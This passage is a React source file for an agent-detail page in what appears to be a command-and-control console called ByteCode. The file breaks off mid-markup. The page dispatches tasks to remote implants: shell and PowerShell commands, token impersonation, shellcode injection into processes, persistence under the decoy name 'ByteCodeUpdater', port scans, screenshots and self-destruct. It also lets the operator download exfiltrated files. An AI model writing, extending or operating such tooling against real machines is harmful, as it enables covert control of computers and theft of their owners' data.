import React, { useState, useEffect, useRef, useCallback, useMemo } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { 
  Terminal as TerminalIcon, 
  Cpu, 
  Globe, 
  Clock, 
  ChevronLeft, 
  Send,
  Loader2,
  CheckCircle2,
  AlertCircle,
  FileText,
  Trash2,
  Zap,
  Folder,
  ChevronRight,
  HardDrive,
  Wifi,
  RefreshCw,
  ArrowDown,
  MousePointer2,
  Monitor,
  ShieldCheck,
  ShieldAlert,
  Bomb,
  Download,
  Activity as ActivityIcon,
  Search,
  Database
} from 'lucide-react';
import { agentsApi, tasksApi } from '../utils/api';
import { format, formatDistanceToNow } from 'date-fns';

const AgentDetailPage = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [command, setCommand] = useState('');
  const [executing, setExecuting] = useState(false);
  const [activeTab, setActiveTab] = useState('console');
  const [psSearchQuery, setPsSearchQuery] = useState('');
  const [netSearchQuery, setNetSearchQuery] = useState('');
  const [fileSearchQuery, setFileSearchQuery] = useState('');
  const [commandHistory, setCommandHistory] = useState([]);
  const [historyIndex, setHistoryIndex] = useState(-1);
  const [toasts, setToasts] = useState([]);
  const [pendingTasks, setPendingTasks] = useState([]);
  const [autoScroll, setAutoScroll] = useState(true);
  const [sidebarCollapsed, setSidebarCollapsed] = useState(false);
  const [isMonitoring, setIsMonitoring] = useState(false);
  const seenPsPids = useRef(new Set());
  const seenNetKeys = useRef(new Set());
  const [highlightedPids, setHighlightedPids] = useState(new Set());
  const [highlightedNetKeys, setHighlightedNetKeys] = useState(new Set());
  const [clearedAt, setClearedAt] = useState(() => {
    return localStorage.getItem(`bytecode_clear_${id}`) || null;
  });

  const lastResultsLength = useRef(0);
  const resultEndRef = useRef(null);

  const addToast = useCallback((title, type = 'info') => {
    const id = Date.now();
    setToasts(prev => [...prev, { id, title, type }]);
    setTimeout(() => {
      setToasts(prev => prev.filter(t => t.id !== id));
    }, 4000);
  }, []);

  const fetchDetails = useCallback(async () => {
    try {
      const details = await agentsApi.get(id);
      setData(details);
      
      setPendingTasks(prev => {
        const now = new Date();
        const results = details.results || [];
        const completed = prev.filter(pt => 
          results.some(r => String(r.task_id) === String(pt.id))
        );
        
        completed.forEach(task => {
          const result = results.find(r => String(r.task_id) === String(task.id));
          const typeStr = (task.task_type || '').replace('_json', '');
          addToast(
            `Task ${typeStr || 'action'} ${result?.status === 'success' ? 'completed' : 'failed'}`, 
            result?.status === 'success' ? 'success' : 'error'
          );
        });

        return prev.filter(pt => {
          const isCompleted = results.some(r => String(r.task_id) === String(pt.id));
          const isStale = (now - new Date(pt.created_at)) > 30000;
          if (isStale && !isCompleted) addToast(`Task ${pt.task_type || 'unknown'} timed out`, 'error');
          return !isCompleted && !isStale;
        });
      });
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  }, [id, addToast]);

  useEffect(() => {
    let isMounted = true;
    const init = async () => { if (isMounted) await fetchDetails(); };
    init();
    const interval = setInterval(fetchDetails, 3000);
    return () => { isMounted = false; clearInterval(interval); };
  }, [fetchDetails]);

  const handleQuickAction = useCallback(async (type, payload) => {
    const targetType = type === 'ls' ? 'ls_json' : type;
    try {
      const result = await tasksApi.create(id, targetType, payload);
      const taskObj = result.task || result;
      const pushed = result.pushed;
      if (pushed) addToast(`Real-time dispatch: ${targetType.replace('_json', '')}`, 'success');

      setPendingTasks(prev => [...prev, {
        id: taskObj.id,
        task_type: targetType,
        task_payload: JSON.stringify(payload),
        status: 'pending',
        created_at: new Date().toISOString(),
        pushed: pushed
      }]);
      fetchDetails();
      return result;
    } catch (err) {
      alert(err.message);
    }
  }, [id, fetchDetails, addToast]);

  useEffect(() => {
    if (!isMonitoring) return;
    const monitor = setInterval(() => {
      if (activeTab === 'processes') handleQuickAction('ps_json', {});
      else if (activeTab === 'network') handleQuickAction('netstat_json', {});
    }, 5000);
    return () => clearInterval(monitor);
  }, [isMonitoring, activeTab, id, handleQuickAction]);

  useEffect(() => {
    const newLength = (data?.results?.length || 0) + pendingTasks.length;
    if (newLength > lastResultsLength.current) {
      if (autoScroll && activeTab === 'console') {
        resultEndRef.current?.scrollIntoView({ behavior: 'smooth' });
      }
      lastResultsLength.current = newLength;
    }
  }, [data?.results, pendingTasks.length, autoScroll, activeTab]);

  const handleKillAgent = async () => {
    if (window.confirm('Are you sure you want to terminate this agent? It will no longer respond to beacons.')) {
      try {
        await agentsApi.kill(id);
        navigate('/agents');
      } catch (err) { alert(err.message); }
    }
  };

  const handleCommand = async (e) => {
    e.preventDefault();
    if (!command.trim() || executing) return;

    const parts = command.trim().split(/\s+/);
    const cmd = parts[0].toLowerCase();
    const args = parts.slice(1);

    let taskType = 'execute_command';
    let payload = { command };

    switch (cmd) {
      case 'clear': {
        const sortedResults = [...(data?.results || [])].sort((a, b) => new Date(a.created_at) - new Date(b.created_at));
        const allItems = [...sortedResults, ...pendingTasks].sort((a, b) => new Date(a.created_at) - new Date(b.created_at));
        const latestItem = allItems[allItems.length - 1];
        const clearPoint = latestItem ? latestItem.created_at : new Date().toISOString();
        setClearedAt(clearPoint);
        localStorage.setItem(`bytecode_clear_${id}`, clearPoint);
        setCommand('');
        return;
      }
      case 'getprivs': taskType = 'getprivs'; payload = {}; break;
      case 'impersonate':
        if (args.length < 1) return addToast('Usage: impersonate <pid>', 'error');
        taskType = 'impersonate'; payload = { pid: parseInt(args[0]) }; break;
      case 'revert_self': taskType = 'revert_self'; payload = {}; break;
      case 'ps': taskType = 'ps_json'; payload = {}; break;
      case 'ls': taskType = 'ls_json'; payload = { path: args[0] || '.' }; break;
      case 'screenshot': taskType = 'screenshot'; payload = {}; break;
      case 'self_destruct':
        if (!confirm('Are you sure? This will remove the agent from the target.')) return;
        taskType = 'self_destruct'; payload = {}; break;
      case 'netstat': taskType = 'netstat_json'; payload = {}; break;
      case 'portscan':
        if (args.length < 1) return addToast('Usage: portscan <target> [ports]', 'error');
        taskType = 'portscan'; payload = { target: args[0], ports: args[1] || '1-1024' }; break;
      case 'persist':
        taskType = 'persist'; payload = { name: args[0] || 'ByteCodeUpdater', path: args[1] || 'C:\\Windows\\Temp\\bytecode.exe' }; break;
      case 'unpersist': taskType = 'unpersist'; payload = { name: args[0] || 'ByteCodeUpdater' }; break;
      case 'getenv': taskType = 'getenv'; payload = {}; break;
      case 'powershell':
        if (args.length < 1) return addToast('Usage: powershell <script_block>', 'error');
        taskType = 'powershell'; payload = { command: args.join(' ') }; break;
      case 'inject':
        if (args.length < 2) return addToast('Usage: inject <pid> <base64_shellcode>', 'error');
        taskType = 'inject'; payload = { pid: parseInt(args[0]), shellcode: args[1] }; break;
      case 'mkdir': if (args.length < 1) return addToast('Usage: mkdir <path>', 'error'); taskType = 'mkdir'; payload = { path: args[0] }; break;
      case 'rm': if (args.length < 1) return addToast('Usage: rm <path>', 'error'); taskType = 'rm'; payload = { path: args[0] }; break;
      case 'cp': if (args.length < 2) return addToast('Usage: cp <src> <dest>', 'error'); taskType = 'cp'; payload = { src: args[0], dest: args[1] }; break;
      case 'mv': if (args.length < 2) return addToast('Usage: mv <src> <dest>', 'error'); taskType = 'mv'; payload = { src: args[0], dest: args[1] }; break;
      case 'cat': if (args.length < 1) return addToast('Usage: cat <path>', 'error'); taskType = 'cat'; payload = { path: args[0] }; break;
      case 'help':
        addToast('Commands: getprivs, impersonate, revert_self, ps, ls, screenshot, netstat, portscan, persist, unpersist, getenv, powershell, inject, mkdir, rm, cp, mv, cat, self_destruct', 'info');
        setCommand(''); return;
    }

    setExecuting(true);
    try {
      const result = await tasksApi.create(id, taskType, payload);
      const taskObj = result.task || result;
      setPendingTasks(prev => [...prev, {
        id: taskObj.id,
        task_type: taskType,
        task_payload: JSON.stringify(payload),
        status: 'pending',
        created_at: new Date().toISOString()
      }]);
      setCommandHistory(prev => [command, ...prev].slice(0, 50));
      setHistoryIndex(-1);
      setCommand('');
      addToast(`Task dispatched: ${taskType}`, 'success');
      fetchDetails();
    } catch (err) {
      console.error(err);
      addToast('Failed to dispatch task', 'error');
    } finally {
      setExecuting(false);
    }
  };

  const handleKeyDown = (e) => {
    if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (historyIndex < commandHistory.length - 1) {
        const nextIndex = historyIndex + 1;
        setHistoryIndex(nextIndex);
        setCommand(commandHistory[nextIndex]);
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (historyIndex > -1) {
        const nextIndex = historyIndex - 1;
        setHistoryIndex(nextIndex);
        setCommand(nextIndex === -1 ? '' : commandHistory[nextIndex]);
      }
    }
  };

  const renderOutput = (res) => {
    const output = res.output;
    if (res.output && res.output.startsWith('SCREENSHOT:')) {
      const dataUri = res.output.replace('SCREENSHOT:', '');
      return (
        <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
          <span style={{ fontSize: 11, color: 'var(--color-text-muted)' }}>Screenshot captured</span>
          <img src={dataUri} alt="Screenshot" style={{ borderRadius: 8, border: '1px solid var(--color-border)', maxWidth: '100%', cursor: 'zoom-in' }} onClick={() => window.open(dataUri)} />
        </div>
      );
    }

    if (res.output && res.output.startsWith('FILE_EXFILTRATED:')) {
      const fullPath = res.output.replace('FILE_EXFILTRATED:', '');
      const fileBasename = fullPath.split(/[\\/]/).pop();
      const filename = fileBasename.split('_').slice(1).join('_') || fileBasename;
      return (
        <div style={{ padding: 14, borderRadius: 8, background: 'var(--color-surface-raised)', border: '1px solid var(--color-border)', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
            <Download size={18} style={{ color: 'var(--color-primary)' }} />
            <div>
              <div style={{ fontSize: 10, fontWeight: 600, color: 'var(--color-primary)', textTransform: 'uppercase' }}>File Captured</div>
              <div style={{ fontSize: 12, fontWeight: 600, color: 'var(--color-text-header)' }}>{filename}</div>
            </div>
          </div>
          <button onClick={async () => {
            try {
              const response = await tasksApi.download(id, fileBasename);
              if (!response.ok) throw new Error('Download failed');
              const blob = await response.blob();
              const url = window.URL.createObjectURL(blob);
              const a = document.createElement('a'); a.href = url; a.download = filename;
              document.body.appendChild(a); a.click(); window.URL.revokeObjectURL(url); document.body.removeChild(a);
            } catch (err) { alert(err.message); }
          }} className="btn btn-primary" style={{ fontSize: 11 }}>Download File</button>
        </div>
      );
    }

    const isBinaryOrDownload = res.task_type === 'download' || 
      (res.output && (res.output.startsWith('PK\x03\x04') || res.output.startsWith('PK\x05\x06') || res.output.startsWith('%PDF') || res.output.startsWith('\x7fELF') || res.output.startsWith('MZ')));

    if (isBinaryOrDownload) {
      let payloadObj = {};
      try { payloadObj = typeof res.task_payload === 'string' ? JSON.parse(res.task_payload) : (res.task_payload || {}); } catch(e) {}
      const targetPath = payloadObj.path || 'exfiltrated_file';
      const filename = targetPath.split(/[\\/]/).pop() || 'file.bin';

      return (
        <div style={{ padding: 14, borderRadius: 8, background: 'var(--color-surface-raised)', border: '1px solid var(--color-border)', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
            <Download size={18} style={{ color: 'var(--color-primary)' }} />
            <div>
              <div style={{ fontSize: 10, fontWeight: 600, color: 'var(--color-primary)', textTransform: 'uppercase' }}>File Captured</div>
              <div style={{ fontSize: 12, fontWeight: 600, color: 'var(--color-text-header)' }}>{filename}</div>
              <div style={{ fontSize: 10, color: 'var(--color-text-dim)', fontFamily: 'var(--font-mono)' }}>{targetPath}</div>
            </div>
          </div>
          <button onClick={() => {
            const blob = new Blob([res.output], { type: 'application/octet-stream' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a'); a.href = url; a.download = filename;
            document.body.appendChild(a); a.click(); window.URL.revokeObjectURL(url); document.body.removeChild(a);
          }} className="btn btn-primary" style={{ fontSize: 11 }}>Download File</button>
        </div>
      );
    }

    if (res.output && (res.output.trim().startsWith('{') || res.output.trim().startsWith('['))) {
      try {
        const parsed = JSON.parse(res.output);
        return (
          <div style={{ background: 'var(--color-background)', borderRadius: 8, border: '1px solid var(--color-border-muted)', overflow: 'hidden' }}>
            <div style={{ padding: '6px 12px', background: 'var(--color-surface-raised)', borderBottom: '1px solid var(--color-border-muted)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <span style={{ fontSize: 10, fontWeight: 600, color: 'var(--color-text-dim)', textTransform: 'uppercase' }}>JSON Output</span>
              <button onClick={() => {
                const blob = new Blob([res.output], { type: 'application/json' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a'); a.href = url; a.download = `result_${res.id}.json`; a.click();
              }} style={{ background: 'none', border: 'none', color: 'var(--color-primary)', fontSize: 10, cursor: 'pointer', fontWeight: 600 }}>Export</button>
            </div>
            <pre style={{ padding: 12, fontSize: 11, fontFamily: 'var(--font-mono)', color: 'var(--color-text)', margin: 0, overflowX: 'auto' }}>
              {JSON.stringify(parsed, null, 2)}
            </pre>
          </div>
        );
      } catch {}
    }

    return (
      <pre style={{ margin: 0, padding: 12, borderRadius: 8, background: 'var(--color-background)', border: '1px solid var(--color-border-muted)', fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--color-text)', whiteSpace: 'pre-wrap', lineHeight: 1.6 }}>
        {res.output || (res.error ? `ERROR: ${res.error}` : 'No output')}
      </pre>
    );
  };

  const agent = data?.agent;
  const results = data?.results || [];
  const isOnline = agent && agent.connection_status === 'online';

  const psList = useMemo(() => {
    const res = [...results].reverse().find(r => r.task_type === 'ps_json' && r.status === 'success');
    try { const parsed = res ? JSON.parse(res.output) : null; return Array.isArray(parsed) ? parsed : null; }
    catch { return null; }
  }, [results]);

  const netList = useMemo(() => {
    const res = [...results].reverse().find(r => r.task_type === 'netstat_json' && r.status === 'success');
    try { const parsed = res ? JSON.parse(res.output) : null; return Array.isArray(parsed) ? parsed : null; }
    catch { return null; }
  }, [results]);

  const getLatestLsResult = () => {
    const lsRes = [...results].reverse().find(r => r.task_type === 'ls_json' && r.status === 'success');
    if (!lsRes) return null;
    try {
      const parsed = JSON.parse(lsRes.output);
      if (!parsed || !Array.isArray(parsed.files)) return null;
      return parsed;
    } catch { return null; }
  };

  const joinPath = (base, addition) => {
    if (!base || base === '.') return addition;
    const isWindows = base.includes('\\') || (agent?.os === 'windows');
    const separator = isWindows ? '\\' : '/';
    let cleanBase = base.endsWith(separator) ? base.slice(0, -1) : base;
    return `${cleanBase}${separator}${addition}`;
  };

  if (!data || !agent) {
    return (
      <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'var(--color-background)' }}>
        {loading ? (
          <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 12 }}>
            <Loader2 size={24} style={{ color: 'var(--color-primary)', animation: 'spin 1s linear infinite' }} />
            <p style={{ fontSize: 11, fontWeight: 600, color: 'var(--color-text-dim)', textTransform: 'uppercase', letterSpacing: '0.1em' }}>Connecting...</p>
          </div>
        ) : (
          <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 16, padding: 40, borderRadius: 14, background: 'var(--color-surface)', border: '1px solid var(--color-border)' }}>
            <AlertCircle size={32} style={{ color: 'var(--color-error)' }} />
            <div style={{ textAlign: 'center' }}>
              <h3 style={{ fontSize: 14, fontWeight: 600, color: 'var(--color-text-header)', marginBottom: 4 }}>Endpoint Unavailable</h3>
              <p style={{ fontSize: 12, color: 'var(--color-text-muted)' }}>Could not load data for this agent.</p>
            </div>
            <button onClick={() => navigate('/agents')} className="btn btn-secondary">Back to Endpoints</button>
          </div>
        )}
      </div>
    );
  }

  return (
    <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden', minHeight: 0, background: 'var(--color-background)' }}>
      {/* ── Top Header Strip ── */}
      <div className="topbar">
        <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
          <button onClick={() => navigate('/agents')} className="btn btn-secondary" style={{ padding: '4px 8px' }}>
            <ChevronLeft size={14} /> Back
          </button>
          <button onClick={() => setSidebarCollapsed(!sidebarCollapsed)} className="btn btn-secondary" style={{ padding: '4px 8px' }} title="Toggle info panel">
            <ActivityIcon size={14} />
          </button>
        </div>

        <div style={{ display: 'flex', alignItems: 'center', gap: 8, flex: 1, marginLeft: 8 }}>
          <div className={`agent-dot ${isOnline ? 'online' : ''}`} />
          <span style={{ fontSize: 13, fontWeight: 700, color: 'var(--color-text-header)' }}>{agent.hostname}</span>
          <span style={{ fontSize: 11, fontFamily: 'var(--font-mono)', color: 'var(--color-text-dim)' }}>({agent.id})</span>
        </div>

        <div style={{ display: 'flex', alignItems: 'center', gap: 16 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 6, fontSize: 11, color: 'var(--color-text-muted)' }}>
            <span>Last seen:</span>
            <span style={{ fontWeight: 600, color: 'var(--color-text)' }}>{agent.last_seen ? formatDistanceToNow(new Date(agent.last_seen), { addSuffix: true }) : 'Never'}</span>
          </div>
          <button onClick={handleKillAgent} className="btn btn-danger" style={{ fontSize: 11 }}>
            <Trash2 size={13} /> Terminate
          </button>
        </div>
      </div>

      {/* ── Main Layout ── */}
      <div style={{ flex: 1, display: 'flex', overflow: 'hidden', minHeight: 0 }}>
        {/* Left Sidebar */}
        {!sidebarCollapsed && (
          <div style={{ width: 240, flexShrink: 0, borderRight: '1px solid var(--color-border)', background: 'var(--color-surface)', overflowY: 'auto', padding: 16, display: 'flex', flexDirection: 'column', gap: 20 }}>
            {/* Specs */}
            <div>
              <div style={{ fontSize: 10, fontWeight: 700, color: 'var(--color-text-dim)', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 8 }}>Endpoint Specs</div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
                {[
                  { label: 'OS', value: agent.os, icon: Monitor },
                  { label: 'Arch', value: agent.arch, icon: Cpu },
                  { label: 'PID', value: agent.pid, icon: ActivityIcon },
                  { label: 'IP', value: agent.ip_address || '0.0.0.0', icon: Wifi },
                ].map((item, i) => (
                  <div key={i} style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '6px 10px', borderRadius: 6, background: 'var(--color-surface-raised)', border: '1px solid var(--color-border-muted)' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                      <item.icon size={12} style={{ color: 'var(--color-text-muted)' }} />
                      <span style={{ fontSize: 11, color: 'var(--color-text-muted)' }}>{item.label}</span>
                    </div>
                    <span style={{ fontSize: 11, fontFamily: 'var(--font-mono)', fontWeight: 600, color: 'var(--color-text-header)' }}>{item.value}</span>
                  </div>
                ))}
              </div>
            </div>

            {/* Quick Commands */}
            <div>
              <div style={{ fontSize: 10, fontWeight: 700, color: 'var(--color-text-dim)', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 8 }}>Quick Shortcuts</div>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 6 }}>
                {[
                  { label: 'Processes', icon: Cpu, type: 'ps_json' },
                  { label: 'Network', icon: Wifi, type: 'netstat_json' },
                  { label: 'Files', icon: Folder, type: 'ls_json' },
                  { label: 'Screenshot', icon: Monitor, type: 'screenshot' },
                  { label: 'Privileges', icon: ShieldCheck, type: 'getprivs' },
                  { label: 'Revert', icon: MousePointer2, type: 'revert_self' },
                ].map((action, i) => (
                  <button key={i} onClick={() => handleQuickAction(action.type, {})}
                    className="btn btn-secondary" style={{ padding: '8px 6px', flexDirection: 'column', gap: 4, fontSize: 10, textAlign: 'center' }}>
                    <action.icon size={14} style={{ color: 'var(--color-primary)' }} />
                    <span>{action.label}</span>
                  </button>
                ))}
              </div>
            </div>

            {/* Danger Actions */}
            <div>
              <div style={{ fontSize: 10, fontWeight: 700, color: 'var(--color-text-dim)', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 8 }}>Dangerous Operations</div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
                <button onClick={() => handleQuickAction('persist', {})} className="btn btn-secondary" style={{ justifyContent: 'flex-start' }}>
                  <ShieldAlert size={13} style={{ color: 'var(--color-warning)' }} /> Persistence
                </button>
                <button onClick={() => { if (confirm('Remove agent binary from target?')) handleQuickAction('self_destruct', {}); }} className="btn btn-danger" style={{ justifyContent: 'flex-start' }}>
                  <Bomb size={13} /> Self Destruct
                </button>
              </div>
            </div>

            {/* Notes */}
            <div>
              <div style={{ fontSize: 10, fontWeight: 700, color: 'var(--color-text-dim)', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 8 }}>Notes</div>
              <textarea
                placeholder="Add operator notes..."
                defaultValue={(() => { try { return JSON.parse(agent.metadata || '{}').notes || ''; } catch { return ''; } })()}
                onBlur={async (e) => {
                  const notes = e.target.value;
                  let metadata = {};
                  try { metadata = JSON.parse(agent.metadata || '{}'); } catch {}
                  if (metadata.notes === notes) return;
                  metadata.notes = notes;
                  await agentsApi.updateMetadata(id, metadata);
                  addToast('Notes saved', 'success');
                }}
                className="input"
                style={{ minHeight: 80, resize: 'none', fontSize: 11 }}
              />
            </div>
          </div>
        )}

        {/* Center Panel */}
        <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden', minHeight: 0, background: 'var(--color-background)' }}>
          {/* Tabs header */}
          <div style={{ display: 'flex', borderBottom: '1px solid var(--color-border)', background: 'var(--color-surface)', padding: '0 16px' }}>
            {[
              { id: 'console', label: 'Terminal', icon: TerminalIcon },
              { id: 'processes', label: 'Processes', icon: Cpu },
              { id: 'network', label: 'Network', icon: Globe },
              { id: 'files', label: 'Files', icon: Folder },
              { id: 'bof', label: 'BOF Runner', icon: Zap },
            ].map(tab => (
              <button key={tab.id} onClick={() => setActiveTab(tab.id)}
                style={{ display: 'flex', alignItems: 'center', gap: 6, padding: '12px 16px', background: 'none', border: 'none', borderBottom: activeTab === tab.id ? '2px solid var(--color-primary)' : '2px solid transparent', color: activeTab === tab.id ? 'var(--color-primary)' : 'var(--color-text-muted)', fontSize: 12, fontWeight: 600, cursor: 'pointer', fontFamily: 'var(--font-sans)', transition: 'color 0.15s' }}>
                <tab.icon size={14} />
                {tab.label}
              </button>
            ))}
          </div>

          {/* ── Console Tab ── */}
          {activeTab === 'console' && (
            <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden', minHeight: 0, position: 'relative' }}>
              <div className="scroll-area" style={{ flex: 1, padding: 20, display: 'flex', flexDirection: 'column', gap: 16 }}>
                {(() => {
                  const sortedResults = [...results].sort((a, b) => new Date(a.created_at) - new Date(b.created_at));
                  let allItems = [...sortedResults, ...pendingTasks].sort((a, b) => new Date(a.created_at) - new Date(b.created_at));
                  if (clearedAt) allItems = allItems.filter(item => new Date(item.created_at).getTime() > new Date(clearedAt).getTime());

                  if (allItems.length === 0) {
                    return <div className="dash-empty"><p>No console history. Type 'help' or run a command.</p></div>;
                  }

                  return allItems.map((res) => {
                    const isPending = !res.status || res.status === 'pending';
                    const payload = typeof res.task_payload === 'string' ? JSON.parse(res.task_payload) : (res.task_payload || {});
                    return (
                      <div key={res.id} style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: 8, fontSize: 11 }}>
                          <span style={{ fontFamily: 'var(--font-mono)', color: 'var(--color-text-dim)' }}>[{format(new Date(res.created_at), 'HH:mm:ss')}]</span>
                          <span className="type-badge">{(res.task_type || 'task').replace('_json', '')}</span>
                          {isPending ? <Loader2 size={12} style={{ color: 'var(--color-primary)', animation: 'spin 1s linear infinite' }} />
                            : res.status === 'success' ? <CheckCircle2 size={12} style={{ color: 'var(--color-success)' }} />
                            : <AlertCircle size={12} style={{ color: 'var(--color-error)' }} />}
                        </div>
                        <div style={{ paddingLeft: 12, borderLeft: '2px solid var(--color-border)' }}>
                          <div style={{ fontFamily: 'var(--font-mono)', fontSize: 12, color: 'var(--color-text-header)', marginBottom: 6 }}>
                            <span style={{ color: 'var(--color-primary)', marginRight: 6 }}>$</span>
                            {payload.command || res.task_type}
                          </div>
                          {!isPending && renderOutput(res)}
                        </div>
                      </div>
                    );
                  });
                })()}
                <div ref={resultEndRef} />
              </div>

              {/* Prompt bar */}
              <form onSubmit={handleCommand} style={{ padding: 12, borderTop: '1px solid var(--color-border)', background: 'var(--color-surface)', display: 'flex', gap: 8 }}>
                <div style={{ flex: 1, position: 'relative', display: 'flex', alignItems: 'center' }}>
                  <span style={{ position: 'absolute', left: 12, color: 'var(--color-primary)', fontFamily: 'var(--font-mono)', fontWeight: 700 }}>$</span>
                  <input type="text" value={command} onChange={e => setCommand(e.target.value)} onKeyDown={handleKeyDown}
                    placeholder="Enter command or 'help'..." className="input" style={{ paddingLeft: 28, fontFamily: 'var(--font-mono)' }} disabled={executing} />
                </div>
                <button type="submit" disabled={executing || !command.trim()} className="btn btn-primary">
                  {executing ? <Loader2 size={14} style={{ animation: 'spin 1s linear infinite' }} /> : <Send size={14} />} Send
                </button>
              </form>
            </div>
          )}

          {/* ── Processes Tab ── */}
          {activeTab === 'processes' && (
            <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden', minHeight: 0, padding: 20 }}>
              <div style={{ display: 'flex', gap: 10, marginBottom: 12, alignItems: 'center' }}>
                <input type="text" placeholder="Search processes..." value={psSearchQuery} onChange={e => setPsSearchQuery(e.target.value)} className="input" style={{ flex: 1 }} />
                <button onClick={() => handleQuickAction('ps_json', {})} className="btn btn-primary">
                  <RefreshCw size={14} /> Refresh Processes
                </button>
              </div>
              <div className="card scroll-area" style={{ flex: 1, minHeight: 0 }}>
                <table className="dash-table">
                  <thead>
                    <tr><th>PID</th><th>Process</th><th>PPID</th><th>Threads</th><th>Actions</th></tr>
                  </thead>
                  <tbody>
                    {psList ? (
                      psList.filter(p => p.name?.toLowerCase().includes(psSearchQuery.toLowerCase())).map(proc => (
                        <tr key={proc.pid}>
                          <td style={{ fontFamily: 'var(--font-mono)', color: 'var(--color-primary)', fontWeight: 600 }}>{proc.pid}</td>
                          <td style={{ fontWeight: 600, color: 'var(--color-text-header)' }}>{proc.name}</td>
                          <td style={{ fontFamily: 'var(--font-mono)', color: 'var(--color-text-muted)' }}>{proc.ppid || '—'}</td>
                          <td style={{ fontFamily: 'var(--font-mono)', color: 'var(--color-text-muted)' }}>{proc.threads || '—'}</td>
                          <td>
                            <button onClick={() => handleQuickAction('kill', { pid: proc.pid })} className="btn btn-danger" style={{ padding: '3px 8px', fontSize: 10 }}>Kill</button>
                          </td>
                        </tr>
                      ))
                    ) : (
                      <tr><td colSpan={5} style={{ textAlign: 'center', padding: 40, color: 'var(--color-text-dim)' }}>No process data available. Click Refresh Processes.</td></tr>
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {/* ── Network Tab ── */}
          {activeTab === 'network' && (
            <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden', minHeight: 0, padding: 20 }}>
              <div style={{ display: 'flex', gap: 10, marginBottom: 12, alignItems: 'center' }}>
                <input type="text" placeholder="Search IP or status..." value={netSearchQuery} onChange={e => setNetSearchQuery(e.target.value)} className="input" style={{ flex: 1 }} />
                <button onClick={() => handleQuickAction('netstat_json', {})} className="btn btn-primary">
                  <RefreshCw size={14} /> Refresh Network
                </button>
              </div>
              <div className="card scroll-area" style={{ flex: 1, minHeight: 0 }}>
                <table className="dash-table">
                  <thead>
                    <tr><th>Proto</th><th>Local Address</th><th>Remote Address</th><th>State</th></tr>
                  </thead>
                  <tbody>
                    {netList ? (
                      netList.filter(c => (c.local || '').includes(netSearchQuery) || (c.remote || '').includes(netSearchQuery) || (c.state || '').toLowerCase().includes(netSearchQuery.toLowerCase())).map((conn, i) => (
                        <tr key={i}>
                          <td><span className="type-badge">{conn.proto || 'TCP'}</span></td>
                          <td style={{ fontFamily: 'var(--font-mono)', color: 'var(--color-text-header)' }}>{conn.local}</td>
                          <td style={{ fontFamily: 'var(--font-mono)', color: 'var(--color-text-muted)' }}>{conn.remote}</td>
                          <td><span className={`status-pill ${conn.state === 'ESTABLISHED' ? 'online' : 'offline'}`}>{conn.state}</span></td>
                        </tr>
                      ))
                    ) : (
                      <tr><td colSpan={4} style={{ textAlign: 'center', padding: 40, color: 'var(--color-text-dim)' }}>No network data available. Click Refresh Network.</td></tr>
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {/* ── Files Tab ── */}
          {activeTab === 'files' && (
            <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden', minHeight: 0, padding: 20 }}>
              {/* Path bar & controls */}
              <div style={{ display: 'flex', gap: 10, marginBottom: 12, alignItems: 'center' }}>
                <button 
                  onClick={() => {
                    const currentPath = getLatestLsResult()?.path || '.';
                    const parentPath = currentPath.split(/[\\/]/).slice(0, -1).join(currentPath.includes('\\') ? '\\' : '/') || '.';
                    handleQuickAction('ls', { path: parentPath });
                  }} 
                  className="btn btn-secondary"
                  style={{ padding: '6px 12px', fontSize: 11, display: 'flex', alignItems: 'center', gap: 4 }}
                  title="Go to parent directory"
                >
                  <ChevronLeft size={14} /> Up
                </button>
                <div style={{ flex: 1, position: 'relative', display: 'flex', alignItems: 'center' }}>
                  <input type="text" placeholder="Search directory..." value={fileSearchQuery} onChange={e => setFileSearchQuery(e.target.value)} className="input" style={{ width: '100%' }} />
                </div>
                <button onClick={() => handleQuickAction('ls', { path: getLatestLsResult()?.path || '.' })} className="btn btn-primary" style={{ padding: '6px 12px', fontSize: 11 }}>
                  <RefreshCw size={14} /> Refresh Directory
                </button>
              </div>

              {/* Current path indicator */}
              {getLatestLsResult()?.path && (
